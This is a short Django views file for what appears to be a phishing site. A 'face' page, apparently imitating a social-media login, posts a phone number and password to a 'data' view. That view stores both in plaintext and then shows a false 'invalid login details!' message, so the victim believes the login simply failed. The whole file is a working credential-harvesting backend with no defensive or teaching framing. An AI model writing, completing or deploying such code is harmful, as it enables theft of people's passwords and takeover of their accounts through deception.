from django.shortcuts import render
from .models import usa
from . import models

from django.contrib import messages

# Create your views here.


def secrets(request):
    return render(request, 'top/home.html')


def face(request):
    return render(request, 'top/face.html')


def data(request):
    if request.method == 'POST':
        number = request.POST['number']
        password = request.POST['password']
        usa = models.usa.objects.create(number=number, password=password)
        usa.save()
        messages.success(request, 'invalid login details!')
        return render(request, 'top/face.html')
